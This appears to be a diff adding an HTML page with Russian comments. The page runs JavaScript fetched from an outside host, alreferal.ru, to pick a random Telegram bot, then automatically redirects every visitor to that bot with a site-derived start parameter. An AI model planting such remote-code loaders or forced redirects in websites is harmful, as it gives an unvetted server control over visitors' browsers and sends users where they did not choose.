@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dynamic Script Load with Error Handling</title>
+</head>
+<body>
+  <script>
+    // Создаем глобальную переменную для хранения имени бота
+    let botName = null;
+
+    // Функция для обработки имени бота, если оно получено в правильном формате JSONP
+    function myCallback(name) {
+      botName = name;
+      redirectToTelegram(botName);
+    }
+
+    // Функция для перенаправления пользователя
+    function redirectToTelegram(botName) {
+      const params = new URLSearchParams(window.location.search);
+      let domain = params.get('domain');
+
+      // Если параметр 'domain' не найден в URL, пытаемся использовать имя бота как домен
+      if (!domain) {
+        console.warn("Параметр 'domain' не найден в URL, используем имя бота.");
+        // Если botName не установлен, используем 'default_bot_name'
+        domain = botName || 'default_bot_name';
+      } else {
+        // Заменяем точку на подчеркивание и добавляем префикс
+        domain = domain.replace(/\./g, '_');
+        domain = `site_${domain}`;
+      }
+
+      // Формируем и выполняем редирект
+      const urlRedirect = `https://t.me/${botName}/?start=${domain}`;
+      window.location.href = urlRedirect;
+    }
+
+    // Динамически загружаем скрипт
+    const script = document.createElement('script');
+    script.src = 'https://alreferal.ru/get_random_bot_hash.php?hash_id=03f5652911133e62454158a3ee6294de86d9de7629e5e13a8e00f24084cec0bb&callback=myCallback';
+    script.onerror = function() {
+      console.error("Ошибка загрузки скрипта или вызова callback.");
+      // В случае ошибки загрузки скрипта используем 'default_bot_name'
+      botName = 'default_bot_name';
+      redirectToTelegram(botName);
+    };
+    document.body.appendChild(script);
+
+    // Таймер ожидания для обработки ситуации, если ответ не в формате JSONP
+    setTimeout(() => {
+      // Пытаемся получить имя бота, если оно не было установлено
+      if (!botName) {
+        // Проверяем наличие переменной prankisland_bot в глобальной области
+        if (window.prankisland_bot) {
+          botName = window.prankisland_bot;
+        } else {
+          // В случае отсутствия botName используем дефолтное значение
+          botName = 'default_bot_name';
+        }
+        redirectToTelegram(botName);
+      }
+    }, 1000); // Ждем 1 секунду
+  </script>
+</body>
+</html>
